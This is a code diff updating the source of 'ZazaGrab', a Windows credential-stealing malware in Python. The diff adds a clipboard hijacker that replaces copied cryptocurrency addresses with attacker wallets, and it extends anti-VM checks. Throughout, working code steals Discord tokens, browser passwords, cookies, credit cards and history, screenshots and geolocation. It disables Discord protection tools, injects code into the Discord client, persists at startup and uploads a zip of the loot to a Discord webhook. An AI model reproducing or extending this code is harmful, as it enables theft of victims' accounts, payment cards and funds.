@@ -12,12 +12,14 @@ import winreg
 import zipfile
 import httpx
 import psutil
-import win32gui
-import win32con
 import base64
 import requests
 import ctypes
 import time
+import pyperclip
+import win32gui
+import win32con
+
 
 from sqlite3 import connect
 from base64 import b64decode
@@ -60,6 +62,16 @@ __config__ = {
     'startup': '%_startup_enabled%',
     'kill_discord_process': '%kill_discord_process%',
     'dbugkiller': '%_debugkiller%',
+    
+    'addresse_crypto_replacer': '%_address_replacer%',
+    'addresse_btc': '%_btc_address%',
+    'addresse_eth': '%_eth_address%',
+    'addresse_xchain': '%_xchain_address%',
+    'addresse_pchain': '%_pchain_address%',
+    'addresse_cchain': '%_cchain_address%',
+    'addresse_monero': '%_monero_address%',
+    'addresse_ada': '%_ada_address%',
+    'addresse_dash': '%_dash_address%',
     'blprggg':
     [
         "httpdebuggerui",
@@ -104,9 +116,10 @@ vctm_pc = os.getenv("COMPUTERNAME")
 r4m = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
 d1sk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
 
-ZazaGrab_Regex = 'https://pastebin.com/raw/f4PM9Dse'
-reg_req = requests.get(ZazaGrab_Regex) 
-clear_reg = r"[\w-]{24}" + reg_req.text
+Zazagrab_Regex = 'https://paste.bingner.com/paste/fhvyp/raw'
+reg_req = requests.get(Zazagrab_Regex) 
+clear_reg = r"[\w-]{24}\." + reg_req.text
+
 
 
 
@@ -210,12 +223,97 @@ class Functions(object):
 
 
 
-class bl4ckc4p(Functions):
+
+
+
+
+
+
+class auto_copy_wallet(Functions):
+    def __init__(self):
+        self.address_st3aler = self.fetch_conf("addresse_crypto_replacer")
+        self.address_btc = self.fetch_conf("addresse_btc")
+        self.address_eth = self.fetch_conf("addresse_eth")
+        self.address_xchain = self.fetch_conf("addresse_xchain")
+        self.address_pchain = self.fetch_conf("addresse_pchain")
+        self.address_cchain = self.fetch_conf("addresse_cchain")
+        self.address_monero = self.fetch_conf("addresse_monero")
+        self.address_ada = self.fetch_conf("addresse_ada")
+        self.address_dash = self.fetch_conf("addresse_dash")
+
+
+    def address_swap(self):
+        try:
+            clipboard_data = pyperclip.paste()
+            if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data):
+                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:
+                    if self.address_btc != "none":
+                        pyperclip.copy(self.address_btc)
+                        pyperclip.paste()
+            
+            if re.search('^0x[a-fA-F0-9]{40}$', clipboard_data):
+                pyperclip.copy(self.address_eth)
+                pyperclip.paste()
+                
+            if re.search('^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):
+                if self.address_xchain != "none":
+                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:
+                        pyperclip.copy(self.address_xchain)
+                        pyperclip.paste()
+                
+                
+            if re.search('^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):
+                if self.address_pchain != "none":
+                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:
+                        pyperclip.copy(self.address_pchain)
+                        pyperclip.paste()
+                
+                
+            if re.search('^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):
+                if self.address_cchain != "none":
+                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:
+                        pyperclip.copy(self.address_cchain)
+                        pyperclip.paste()
+                
+                
+            if re.search('addr1[a-z0-9]+', clipboard_data):
+                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:
+                        pyperclip.copy(self.address_ada)
+                        pyperclip.paste()
+                
+            if re.search('/X[1-9A-HJ-NP-Za-km-z]{33}$/g', clipboard_data):
+                if self.address_dash != "none":
+                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:
+                        pyperclip.copy(self.address_dash)
+                        pyperclip.paste()
+                
+            if re.search('/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g', clipboard_data):
+                if self.address_monero != "none":
+                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:
+                        pyperclip.copy(self.address_monero)
+                        pyperclip.paste()
+                
+                
+        except:
+            data = None
+            
+            
+    def loop_through(self):
+        
+        while True:
+            self.address_swap()
+     
+    def run(self):
+        if self.address_st3aler == "yes":
+            self.loop_through()
+
+
+class bc_initial_func(Functions):
     def __init__(self):
         
         self.dscap1 = "https://discord.com/api/v9/users/@me"
 
-        self.w3bh00k = self.fetch_conf('yourwebhookurl')
+        self.discord_webhook = self.fetch_conf('yourwebhookurl')
 
         self.hide = self.fetch_conf("hide")
 
@@ -245,7 +343,7 @@ class bl4ckc4p(Functions):
 
         self.srtupl0c = ntpath.join(self.roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
 
-        self.h00ksreg = "api/webhooks"
+        self.regex_webhook_dsc = "api/webhooks"
 
         self.chrmrgx = re.compile(r'(^profile\s\d*)|default|(guest profile$)', re.IGNORECASE | re.MULTILINE);
         
@@ -257,7 +355,7 @@ class bl4ckc4p(Functions):
 
         self.tokens = []
 
-        self.ids = []
+        self.bc_id = []
 
         self.sep = os.sep;
 
@@ -271,31 +369,27 @@ class bl4ckc4p(Functions):
 
     
 
-    def hiding(self: str) -> str:
-        if self.hide == "yes":
-            hide = win32gui.GetForegroundWindow()
-            win32gui.ShowWindow(hide, win32con.SW_HIDE)
 
-    def fakeerror(self: str) -> str:
+    def error_remote(self: str) -> str:
         if self.fake_error == "yes":
-            ctypes.windll.user32.MessageBoxW(None, 'Error code: ZazaGrab_0x988958\nSomething gone wrong.', 'Fatal Error', 0)
+            ctypes.windll.user32.MessageBoxW(None, 'Error code: Windows_0x988958\nSomething gone wrong.', 'Fatal Error', 0)
 
-    def pingonrunning(self: str) -> str:
+    def ping_on_running(self: str) -> str:
         ping1 = {
-            'avatar_url': 'https://media.discordapp.net/attachments/1055997057149710388/1066504205835173928/zazagrab2.jpg',
+            'avatar_url': 'https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/master/zazagrab(2).jpg',
             'content': "@everyone"
             }
         ping2 = {
-            'avatar_url': 'https://media.discordapp.net/attachments/1055997057149710388/1066504205835173928/zazagrab2.jpg',
+            'avatar_url': 'https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/master/zazagrab(2).jpg',
             'content': "@here"
             }
         if self.pingonrun == "yes":
-            if self.h00ksreg in self.w3bh00k:
+            if self.regex_webhook_dsc in self.discord_webhook:
                 if self.pingtype == "@everyone" or self.pingtype == "everyone":
-                    httpx.post(self.w3bh00k, json=ping1)
+                    httpx.post(self.discord_webhook, json=ping1)
             if self.pingtype == "@here" or self.pingtype == "here":
-                if self.h00ksreg in self.w3bh00k :
-                    httpx.post(self.w3bh00k, json=ping2)
+                if self.regex_webhook_dsc in self.discord_webhook :
+                    httpx.post(self.discord_webhook, json=ping2)
 
 
 
@@ -309,13 +403,20 @@ class bl4ckc4p(Functions):
                 copy2(argv[0], startup_path)
 
 
+                
+    def hidethis(self: str) -> str:
+        if self.hide == "yes":
+            hide = win32gui.GetForegroundWindow()
+            win32gui.ShowWindow(hide, win32con.SW_HIDE)
 
 
-    def _bexit(self):
+
+
+    def bc_exit_this(self):
         shutil.rmtree(self.dir, ignore_errors=True)
         os._exit(0)
 
-    def trexctrac(func):
+    def extract_try(func):
         '''Decorator to safely catch and ignore exceptions'''
         def wrapper(*args, **kwargs):
             try:
@@ -342,8 +443,9 @@ class bl4ckc4p(Functions):
             'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
             'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
             'iridium': self.appdata + '\\Iridium\\User Data',
-        }
+            'edge': self.appdata + "\\Microsoft\\Edge\\User Data"
 
+        }        
         self.profiles = [
             'Default',
             'Profile 1',
@@ -353,25 +455,24 @@ class bl4ckc4p(Functions):
             'Profile 5',
         ]
 
-        if self.w3bh00k == "" or self.w3bh00k == "\x57EBHOOK_HERE":
-            self._bexit()
+        if self.discord_webhook == "" or self.discord_webhook == "\x57EBHOOK_HERE":
+            self.bc_exit_this()
             
-        self.hiding()
-        self.fakeerror()
-        self.pingonrunning()
+        self.hidethis()
+        self.error_remote()
         self.startupzazagrab()
 
-        if self.fetch_conf('dbugkiller') and AntiDebug().inVM is True:
-            self._bexit()
-        await self.bypbd()
-        await self.byptknp()
+        if self.fetch_conf('dbugkiller') and NoDebugg().inVM is True:
+            self.bc_exit_this()
+        await self.bypass_bttdsc()
+        await self.bypass_tokenprtct()
 
-        function_list = [self.scrinsh, self.sysd1, self.grbtkn, self.grbmc, self.grbr0blx]
+        function_list = [self.steal_screen, self.system_informations, self.steal_token, self.grabb_mc, self.grabb_roblox]
 
 
         if self.fetch_conf('kill_discord_process'):
 
-            await self.kllprcsx()
+            await self.kill_process_id()
 
 
 
@@ -382,10 +483,10 @@ class bl4ckc4p(Functions):
 
             self.masterkey = self.gtmk3y(path + '\\Local State')
             self.funcs = [
-                self.grbcook,
-                self.gethistez,
-                self.grbpsw2,
-                self.getccez
+                self.steal_cookies2,
+                self.steal_history2,
+                self.steal_passwords2,
+                self.steal_cc2
             ]
 
             for profile in self.profiles:
@@ -397,7 +498,7 @@ class bl4ckc4p(Functions):
             
         if ntpath.exists(self.chrmmuserdtt) and self.chrome_key is not None:
             os.makedirs(ntpath.join(self.dir, 'Google'), exist_ok=True)
-            function_list.extend([self.grbpsw, self.grbcoke, self.grbhis])
+            function_list.extend([self.steal_passwords, self.steal_cookies, self.steal_history])
 
         for func in function_list:
             process = threading.Thread(target=func, daemon=True)
@@ -407,13 +508,14 @@ class bl4ckc4p(Functions):
                 t.join()
             except RuntimeError:
                 continue
-        self.ntfytkn()
-        await self._1ject()
-        self.ending()
+        self.natify_matched_tokens()
+        await self._inject_disc()
+        self.ping_on_running()
+        self.finished_bc()
 
     
 
-    async def _1ject(self):
+    async def _inject_disc(self):
         # TO DO: reduce cognetive complexity
         for _dir in os.listdir(self.appdata):
 
@@ -443,8 +545,9 @@ class bl4ckc4p(Functions):
                                         except PermissionError:
                                             pass
 
-                                    if self.h00ksreg in self.w3bh00k:
-                                        f = httpx.get(self.fetch_conf('zazagrab_inject_url')).text.replace("%WEBHOOK%", self.w3bh00k)
+                                    if self.regex_webhook_dsc in self.discord_webhook:
+                                        
+                                        f = httpx.get(self.fetch_conf('zazagrab_inject_url')).text.replace("%WEBHOOK%", self.discord_webhook)#.replace("%num_core_discord%", inj_path + 'index.js')
                                     
                                     try:
                                         with open(inj_path + 'index.js', 'w', errors="ignore") as indexFile:
@@ -455,7 +558,7 @@ class bl4ckc4p(Functions):
                                     if self.fetch_conf('kill_discord_process'):
                                         os.startfile(app + self.sep + _dir + '.exe')
 
-    async def byptknp(self):
+    async def bypass_tokenprtct(self):
         tp = f"{self.roaming}\\DiscordTokenProtector\\"
         if not ntpath.exists(tp):
             return
@@ -472,7 +575,7 @@ class bl4ckc4p(Functions):
                     item = json.load(f)
                 except json.decoder.JSONDecodeError:
                     return
-                item['ksch_is_here'] = "https://github.com/xKrustyDemonx"
+                item['ksch_is_here'] = "https://github.com/zazaman4000"
                 item['auto_start'] = False
                 item['auto_start_discord'] = False
                 item['integrity'] = False
@@ -489,9 +592,9 @@ class bl4ckc4p(Functions):
             with open(config, 'w') as f:
                 json.dump(item, f, indent=2, sort_keys=True)
             with open(config, 'a') as f:
-                f.write("\n\n//Soles_is_here | https://github.com/xKrustyDemonx")
+                f.write("\n\n//zazaman4000_is_here | https://github.com/zazaman4000")
 
-    async def kllprcsx(self):
+    async def kill_process_id(self):
         bllist = self.fetch_conf('blprggg')
         for i in ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']:
             bllist.append(i)
@@ -503,17 +606,17 @@ class bl4ckc4p(Functions):
                     pass
 
 
-    async def bypbd(self):
+    async def bypass_bttdsc(self):
         bd = self.roaming + "\\BetterDiscord\\data\\betterdiscord.asar"
         if ntpath.exists(bd):
-            x = self.h00ksreg
+            x = self.regex_webhook_dsc
             with open(bd, 'r', encoding="cp437", errors='ignore') as f:
                 txt = f.read()
                 content = txt.replace(x, 'KSCHishere')
             with open(bd, 'w', newline='', encoding="cp437", errors='ignore') as f:
                 f.write(content)
 
-    @trexctrac
+    @extract_try
     def decrypt_val(self, buff, master_key):
         try:
             iv = buff[3:15]
@@ -534,7 +637,7 @@ class bl4ckc4p(Functions):
         master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
         return master_key
 
-    def grbtkn(self):
+    def steal_token(self):
         paths = {
             'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
             'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
@@ -570,10 +673,10 @@ class bl4ckc4p(Functions):
             disc = name.replace(" ", "").lower()
             if "cord" in path:
                 if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
-                    for file_name in os.listdir(path):
-                        if file_name[-3:] not in ["log", "ldb"]:
+                    for filname in os.listdir(path):
+                        if filname[-3:] not in ["log", "ldb"]:
                             continue
-                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for line in [x.strip() for x in open(f'{path}\\{filname}', errors='ignore').readlines() if x.strip()]:
                             for y in re.findall(self.encrypted_regex, line):
                                 try:
                                     token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
@@ -588,14 +691,14 @@ class bl4ckc4p(Functions):
                                     pass
                                 if r.status_code == 200:
                                     uid = r.json()['id']
-                                    if uid not in self.ids:
+                                    if uid not in self.bc_id:
                                         self.tokens.append(token)
-                                        self.ids.append(uid)
+                                        self.bc_id.append(uid)
             else:
-                for file_name in os.listdir(path):
-                    if file_name[-3:] not in ["log", "ldb"]:
+                for filname in os.listdir(path):
+                    if filname[-3:] not in ["log", "ldb"]:
                         continue
-                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                    for line in [x.strip() for x in open(f'{path}\\{filname}', errors='ignore').readlines() if x.strip()]:
                         for token in re.findall(self.regex, line):
                             try:
                                 r = requests.get(self.baseurl, headers={
@@ -606,9 +709,9 @@ class bl4ckc4p(Functions):
                                 pass
                             if r.status_code == 200:
                                 uid = r.json()['id']
-                                if uid not in self.ids:
+                                if uid not in self.bc_id:
                                     self.tokens.append(token)
-                                    self.ids.append(uid)
+                                    self.bc_id.append(uid)
 
         if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
             for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
@@ -626,9 +729,9 @@ class bl4ckc4p(Functions):
                                 pass
                             if r.status_code == 200:
                                 uid = r.json()['id']
-                                if uid not in self.ids:
+                                if uid not in self.bc_id:
                                     self.tokens.append(token)
-                                    self.ids.append(uid)
+                                    self.bc_id.append(uid)
 
 
 
@@ -636,20 +739,20 @@ class bl4ckc4p(Functions):
 
                                     
 
-    def randomdircreator(self, _dir: str or os.PathLike = gettempdir()):
-        file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
-        path = os.path.join(_dir, file_name)
+    def random_dir_create(self, _dir: str or os.PathLike = gettempdir()):
+        filname = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
+        path = os.path.join(_dir, filname)
         open(path, "x")
         return path
 
 
-    @trexctrac
-    def grbpsw2(self, name: str, path: str, profile: str):
+    @extract_try
+    def steal_passwords2(self, name: str, path: str, profile: str):
         path += '\\' + profile + '\\Login Data'
         if not os.path.isfile(path):
             return
 
-        loginvault = self.randomdircreator()
+        loginvault = self.random_dir_create()
         copy2(path, loginvault)
         conn = sqlite3.connect(loginvault)
         cursor = conn.cursor()
@@ -663,12 +766,12 @@ class bl4ckc4p(Functions):
         conn.close()
         os.remove(loginvault)
 
-    @trexctrac
-    def grbcook(self, name: str, path: str, profile: str):
+    @extract_try
+    def steal_cookies2(self, name: str, path: str, profile: str):
         path += '\\' + profile + '\\Network\\Cookies'
         if not os.path.isfile(path):
             return
-        cookievault = self.randomdircreator()
+        cookievault = self.random_dir_create()
         copy2(path, cookievault)
         conn = sqlite3.connect(cookievault)
         cursor = conn.cursor()
@@ -690,8 +793,8 @@ class bl4ckc4p(Functions):
 
 
 
-    @trexctrac
-    def grbpsw(self):
+    @extract_try
+    def steal_passwords(self):
         f = open(ntpath.join(self.dir, 'Google', 'Passwords.txt'), 'w', encoding="cp437", errors='ignore')
         for prof in os.listdir(self.chrmmuserdtt):
             if re.match(self.chrmrgx, prof):
@@ -718,8 +821,8 @@ class bl4ckc4p(Functions):
 
 
 
-    @trexctrac
-    def grbcoke(self):
+    @extract_try
+    def steal_cookies(self):
         f = open(ntpath.join(self.dir, 'Google', 'Cookies.txt'), 'w', encoding="cp437", errors='ignore')
         for prof in os.listdir(self.chrmmuserdtt):
 
@@ -739,7 +842,7 @@ class bl4ckc4p(Functions):
                     user = r[1]
                     decrypted_cookie = self.dcrpt_val(r[2], self.chrome_key)
                     if host != "":
-                        f.write(f"HOST KEY: {host} | NAME: {user} | VALUE: {decrypted_cookie}\n")
+                        f.write(f"{host}	TRUE"+"		"+ f"/FALSE	2597573456	{user}	{decrypted_cookie}\n")
                     if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie:
                         self.robloxcookies.append(decrypted_cookie)
 
@@ -748,11 +851,11 @@ class bl4ckc4p(Functions):
                 os.remove(login)
         f.close()
 
-    def gethistez(self, name: str, path: str, profile: str):
+    def steal_history2(self, name: str, path: str, profile: str):
         path += '\\' + profile + '\\History'
         if not os.path.isfile(path):
             return
-        historyvault = self.randomdircreator()
+        historyvault = self.random_dir_create()
         copy2(path, historyvault)
         conn = sqlite3.connect(historyvault)
         cursor = conn.cursor()
@@ -769,13 +872,13 @@ class bl4ckc4p(Functions):
         conn.close()
         os.remove(historyvault)
 
-    def getccez(self, name: str, path: str, profile: str):
+    def steal_cc2(self, name: str, path: str, profile: str):
         path += '\\' + profile + '\\Web Data'
         if not os.path.isfile(path):
             return
-        cardvault = self.randomdircreator()
-        copy2(path, cardvault)
-        conn = sqlite3.connect(cardvault)
+        credit_card_vault = self.random_dir_create()
+        copy2(path, credit_card_vault)
+        conn = sqlite3.connect(credit_card_vault)
         cursor = conn.cursor()
         with open(os.path.join(self.dir, "Browsers", "All Creditcards.txt"), 'a', encoding="utf-8") as f:
             for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
@@ -786,11 +889,11 @@ class bl4ckc4p(Functions):
         f.close()
         cursor.close()
         conn.close()
-        os.remove(cardvault)
+        os.remove(credit_card_vault)
 
 
-    @trexctrac
-    def grbhis(self):
+    @extract_try
+    def steal_history(self):
         f = open(ntpath.join(self.dir, 'Google', 'History.txt'), 'w', encoding="cp437", errors='ignore')
 
         def xtractwbhist(db_cursor):
@@ -835,7 +938,7 @@ class bl4ckc4p(Functions):
         f.close()
 
 
-    def ntfytkn(self):
+    def natify_matched_tokens(self):
 
         f = open(self.dir + "\\Discord_Info.txt", "w", encoding="cp437", errors='ignore')
 
@@ -882,7 +985,7 @@ class bl4ckc4p(Functions):
         f.close()
 
 
-    def grbmc(self):
+    def grabb_mc(self):
         minecraftpath = ntpath.join(self.dir, 'Minecraft')
         os.makedirs(minecraftpath, exist_ok=True)
         mc = ntpath.join(self.roaming, '.minecraft')
@@ -897,7 +1000,7 @@ class bl4ckc4p(Functions):
 
                 
 
-    def grbr0blx(self):
+    def grabb_roblox(self):
         def subproc(path):
             try:
                 return subprocess.check_output(
@@ -915,7 +1018,7 @@ class bl4ckc4p(Functions):
                 for i in self.robloxcookies:
                     f.write(i + '\n')
 
-    def scrinsh(self):
+    def steal_screen(self):
         image = ImageGrab.grab(
             bbox=None,
             include_layered_windows=False,
@@ -925,7 +1028,7 @@ class bl4ckc4p(Functions):
         image.save(self.dir + "\\Screenshot.png")
         image.close()
 
-    def sysd1(self):
+    def system_informations(self):
         about = f"""
 {infocom} | {vctm_pc}
 Windows key: {self.w1nk33y}
@@ -948,7 +1051,8 @@ GoogleMaps: {self.googlemap}
 
 
 
-    def ending(self):
+
+    def finished_bc(self):
         for i in os.listdir(self.dir):
             if i.endswith('.txt'):
                 path = self.dir + self.sep + i
@@ -959,11 +1063,11 @@ GoogleMaps: {self.googlemap}
                         os.remove(path)
                     else:
                         with open(path, "w", encoding="utf-8", errors="ignore") as f:
-                            f.write("Zaza Grab Create By Soles | https://github.com/xKrustyDemonx\n\n")
+                            f.write("Zaza Grab Create By ZAZA | https://github.com/zazaman4000\n\n")
                         with open(path, "a", encoding="utf-8", errors="ignore") as fp:
-                            fp.write(x + "\n\nZaza Grab Create By Soles | https://github.com/xKrustyDemonx")
+                            fp.write(x + "\n\nZaza Grab Create By ZAZA | https://github.com/zazaman4000")
 
-        _zipfile = ntpath.join(self.appdata, f'ZG-[{infocom}].zip')
+        _zipfile = ntpath.join(self.appdata, f'BC-[{infocom}].zip')
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
         abs_src = ntpath.abspath(self.dir)
         for dirname, _, files in os.walk(self.dir):
@@ -984,43 +1088,43 @@ GoogleMaps: {self.googlemap}
 
         embed = {
             'name': "ZazaGrab",
-            'avatar_url': 'https://media.discordapp.net/attachments/1055997057149710388/1066504205835173928/zazagrab2.jpg',
+            'avatar_url': 'https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/master/zazagrab%20-%20injection.jpg',
             'embeds': [
                 {
                     'author': {
-                        'name': f'Zaza - Grab v2.1',
-                        'url': 'https://github.com/xKrustyDemonx',
-                        'icon_url': 'https://raw.githubusercontent.com/xKrustyDemonx/zazagrab-assets/main/mona-loading-dark.gif'
+                        'name': f'ZazaGrab v2.3',
+                        'url': 'https://github.com/zazaman4000',
+                        'icon_url': 'https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/master/mona-loading-dark.gif'
                     },
                     'color': 374276,
-                    'description': f'[Zaza - Grab has Geo Localised this guy]({self.googlemap})',
+                    'description': f'[zazagrab has Geo Localised this guy]({self.googlemap})',
                     'fields': [
                         {
                             'name': '\u200b',
                             'value': f'''```fix
-                                IP:᠎ {self.ip.replace(" ", "᠎ ") if self.ip else "N/A"}
-                                Org:᠎ {self.org.replace(" ", "᠎ ") if self.org else "N/A"}
-                                City:᠎ {self.city.replace(" ", "᠎ ") if self.city else "N/A"}
-                                Region:᠎ {self.region.replace(" ", "᠎ ") if self.region else "N/A"}
-                                Country:᠎ {self.country.replace(" ", "᠎ ") if self.country else "N/A"}```
+                                IP: {self.ip.replace(" ", " ") if self.ip else "N/A"}
+                                Org: {self.org.replace(" ", " ") if self.org else "N/A"}
+                                City: {self.city.replace(" ", " ") if self.city else "N/A"}
+                                Region: {self.region.replace(" ", " ") if self.region else "N/A"}
+                                Country: {self.country.replace(" ", " ") if self.country else "N/A"}```
                             '''.replace(' ', ''),
                             'inline': True
                         },
                         {
                             'name': '\u200b',
                             'value': f'''```fix
-                                Computer Name: {vctm_pc.replace(" ", "᠎ ")}
-                                Windows Key:᠎ {self.w1nk33y.replace(" ", "᠎ ")}
-                                Windows Ver:᠎ {self.w1nv3r.replace(" ", "᠎ ")}
-                                Disk Stockage:᠎ {d1sk}GB
-                                Ram Stockage:᠎ {r4m}GB```
+                                Computer Name: {vctm_pc.replace(" ", " ")}
+                                Windows Key: {self.w1nk33y.replace(" ", " ")}
+                                Windows Ver: {self.w1nv3r.replace(" ", " ")}
+                                Disk Stockage: {d1sk}GB
+                                Ram Stockage: {r4m}GB```
                             '''.replace(' ', ''),
                             'inline': True
                         },
                         {
                             'name': '**- Tokens:**',
                             'value': f'''```yaml
-                                {tokens if tokens else "tokens not found"}```
+                                {tokens if tokens else "tokens not found"}```
                             '''.replace(' ', ''),
                             'inline': False
                         },
@@ -1035,7 +1139,7 @@ GoogleMaps: {self.googlemap}
                         }
                     ],
                     'footer': {
-                        'text': 'Zaza Grab Create By Soles・https://github.com/xKrustyDemonx'
+                        'text': 'Zaza Grab Create By ZAZA・https://github.com/zazaman4000'
                     }
                 }
             ]
@@ -1043,27 +1147,31 @@ GoogleMaps: {self.googlemap}
 
 
         with open(_zipfile, 'rb') as f:
-            if self.h00ksreg in self.w3bh00k:
-                httpx.post(self.w3bh00k, json=embed)
-                httpx.post(self.w3bh00k, files={'upload_file': f})
+            if self.regex_webhook_dsc in self.discord_webhook:
+                httpx.post(self.discord_webhook, json=embed)
+                httpx.post(self.discord_webhook, files={'upload_file': f})
         os.remove(_zipfile)
 
 
 
-class AntiDebug(Functions):
+
+
+
+
+class NoDebugg(Functions):
     inVM = False
 
     def __init__(self):
         self.processes = list()
 
         self.bluseurs = [
-            "WDAGUtilityAccount", "Robert", "Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq",
+            "WDAGUtilityAccount", "BvJChRPnsxn", "Harry Johnson", "SqgFOf3G", "RGzcBUyrznReg", "h7dk1xPr","Robert", "Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq",
             "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl",
         ]
         self.blpcname = [
             "DESKTOP-CDLNVOQ", "BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM",
             "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4",
-            "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH",
+            "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH", "DESKTOP-B0T93D6"
         ]
         self.blhwid = [
             "7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009",
@@ -1075,7 +1183,22 @@ class AntiDebug(Functions):
             "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670",
             "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A",
             "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27",
+            "BB64E044-87BA-C847-BC0A-C797D1A16A50", "2E6FB594-9D55-4424-8E74-CE25A25E36B0", "42A82042-3F13-512F-5E3D-6BF4FFFD8518"
         ]
+        self.blips = [
+            '88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', 
+            '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116', '34.105.183.68', 
+            '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', 
+            '109.145.173.169', '34.141.146.114', '212.119.227.151', '195.239.51.59', '192.40.57.234', 
+            '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241',
+             '109.74.154.92', '213.33.142.50', '109.74.154.91', '93.216.75.209', '192.87.28.103', 
+             '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', 
+             '188.105.91.143', '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', 
+             '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', 
+             '80.211.0.97', '34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23', 
+             '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228', '212.119.227.167', 
+             '193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107'
+             ]
 
